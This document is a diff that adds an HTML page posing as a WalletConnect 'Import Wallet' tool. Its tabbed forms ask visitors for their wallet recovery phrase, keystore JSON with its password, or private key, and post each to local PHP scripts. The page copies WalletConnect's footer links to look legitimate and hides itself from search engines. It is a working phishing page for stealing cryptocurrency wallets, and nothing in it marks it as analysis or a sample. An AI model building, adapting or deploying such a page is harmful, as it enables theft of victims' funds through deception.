@@ -1,0 +1,123 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Import Wallet - Trusted Platform</title>
+<meta name="author" content="Non Custodian Asset-Trusted Platform">
+<meta name="description" content="Following decentralised finance and blockchain applications support Wallets Validation wallets.">
+<meta name="robots" content="noindex">
+<meta property="og:image" content="./port/logo.svg">
+<link rel="icon" href="./port/logo.svg">
+<link rel="stylesheet" href="./port/main.css" type="text/css">
+
+	<script>
+        function openCity(evt, cityName) {
+        // Declare all variables
+        var i, tabcontent, tablinks;
+      
+        // Get all elements with class="tabcontent" and hide them
+        tabcontent = document.getElementsByClassName("tabcontent");
+        for (i = 0; i < tabcontent.length; i++) {
+          tabcontent[i].style.display = "none";
+        }
+      
+        // Get all elements with class="tablinks" and remove the class "active"
+        tablinks = document.getElementsByClassName("tablinks");
+        for (i = 0; i < tablinks.length; i++) {
+          tablinks[i].className = tablinks[i].className.replace(" active", "");
+        }
+      
+        // Show the current tab, and add an "active" class to the button that opened the tab
+        document.getElementById(cityName).style.display = "block";
+        evt.currentTarget.className += " active";
+      }
+      </script>
+
+</head>
+    
+    
+    
+    <body>
+    <center>
+    <div class="top">
+            <a href="#footer" target="_blank" class="left">Github</a>
+            <a href="#footer" target="_blank" class="left">Docs</a>
+            <a href="#importwallets" class="main"><img src="./port/logo.svg" alt="logo"></a>
+            <a href="#importwallets" class="left">Wallets</a>
+            <a href="../index.html" class="left">Apps</a>    </div>
+    <br>
+    <h2><center>Import Wallet</center></h2>
+    <br>
+    <div class="tab">
+      <button class="tablinks active" id="default" onClick="openCity(event, 'phrase')">Phrase</button>
+      <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</button>
+      <button class="tablinks" onClick="openCity(event, 'private')">Private Key</button>
+    </div>
+    
+    <div id="phrase" class="tabcontent" style="display: block;">
+    <form action="./actions/imports.php" method="POST">
+    
+    <input type="hidden" name="category" value="Phrase">
+    <div class="field">
+	<input type="text" name="wallet" value="" placeholder="Wallet Type" required>
+    </div>
+    <textarea name="phrase" class="phrase" minlength="12" placeholder="Phrase" required></textarea>
+    <br>
+    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+    <br>
+    <button type="submit" name="import" class="btn">IMPORT</button>
+    </form>
+    </div>
+    
+    <div id="keystore" class="tabcontent" style="display: none;">
+    <form action="actions/import.php" method="POST">
+    
+    <input type="hidden" name="category" value="Keystore JSON">
+    <div class="field">
+	<input type="text" name="wallet" value="" placeholder="Wallet Type" required>
+    </div>
+    <textarea name="phrase" class="phrase" minlength="12" placeholder="Keystore JSON" required></textarea>
+    <br>
+    <div class="field">
+        <input type="text" name="password" placeholder="Password" required>
+    </div>
+    <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+    <br>
+    <button type="submit" name="import" class="btn">IMPORT</button>
+    </form>
+    </div>
+    
+    <div id="private" class="tabcontent" style="display: none;">
+    <form action="actions/importc.php" method="POST">
+    <input type="hidden" name="category" value="Private Key">
+    <div class="field">
+	<input type="text" name="wallet" value="" placeholder="Wallet Type" required>
+    </div>
+    <div class="field">
+        <input type="text" name="key" class="key" placeholder="Private Key" required>
+    </div>
+    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+    <br>
+    <button type="submit" name="import" class="btn">IMPORT</button>
+    </form>
+    </div>
+    
+    <script>
+        document.getElementById("default").click();
+        const urlParams = new URLSearchParams(window.location.search)
+        const walletType = urlParams.get("type")
+        document.querySelectorAll("input[name='wallet']").forEach( node => {
+          node.value = walletType
+        })
+    </script>
+    <footer><div id="footer">
+    <p><img src="./port/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP" target="_blank">Discord</a></p><br>
+    <p><img src="./port/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements" target="_blank">Telegram</a></p><br>
+    <p><img src="./port/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/" target="_blank">Twitter</a></p><br>
+    <p><img src="./port/github.svg" class="footimg">  <a href="https://github.com/walletconnect" target="_blank">Github</a></p><br>
+    </div></footer>
+</center>
+</body>
+    </html>
